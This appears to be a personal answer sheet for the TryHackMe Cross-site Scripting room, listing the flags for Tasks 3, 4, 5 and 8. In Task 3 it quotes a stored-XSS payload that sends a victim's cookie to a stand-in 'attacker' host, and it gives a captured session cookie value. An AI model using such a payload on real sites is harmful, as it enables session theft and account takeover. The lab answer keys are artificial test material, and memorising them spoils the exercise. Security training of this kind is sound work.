# TryHackMe Cross-site Scripting

> Saikat Karmakar | Jul 28 : 2021


---

## Task 3

1. Doing so will reveal the answer to this question.
```
HTML_T4gs
```
2. Create an alert popup box appear on the page with your document cookies.
```
W3LL_D0N3_LVL2
```
3. Change "XSS Playground" to "I am a hacker" by adding comments and using Javascript.
```
websites_can_be_easily_defaced_with_xss
```
Stored XSS can be used to steal a victims cookie (data on a machine that authenticates a user to a webserver). This can be done by having a victims browser parse the following Javascript code:

<script>window.location='http://attacker/?cookie='+document.cookie</script>

This script navigates the users browser to a different URL, this new request will includes a victims cookie as a query parameter. When the attacker has acquired the cookie, they can use it to impersonate the victim. 

4. Take over Jack's account by stealing his cookie, what was his cookie value?
```
s%3Aat0YYHmITnfNSF0kM5Ne-ir1skTX3aEU.yj1%2FXoaxe7cCjUYmfgQpW3o5wP3O8Ae7YNHnHPJIasE
```
5. Post a comment as Jack.
```
c00ki3_stealing_
```

## Task 4


1. Craft a reflected XSS payload that will cause a popup saying "Hello"
```
ThereIsMoreToXSSThanYouThink
```
2. Craft a reflected XSS payload that will cause a popup with your machines IP address.
```
ReflectiveXss4TheWin
```

## Task 5

1. Look at the deployed machines DOM-Based XSS page source code, and figure out a way to exploit it by executing an alert with your cookies.
```
BreakingAnElementsTag
```
2. Create an onhover event on an image tag, that change the background color of the website to red.
```
JavascriptIsAwesome
```

## Task 8

1. Bypass the filter that removes any script tags.
```
3c3cf8d90aaece81710ab9db759352c0
```
2. The word alert is filtered, bypass it.
```
a2e5ef66f5ff584a01d734ef5edaae91
```
3. The word hello is filtered, bypass it.
```
decba45d0eff17c6eedf1629393bee1d
```
4. Filtered in challenge 4 is as follows:
```
2482d2e8939fc85a9363617782270555
```

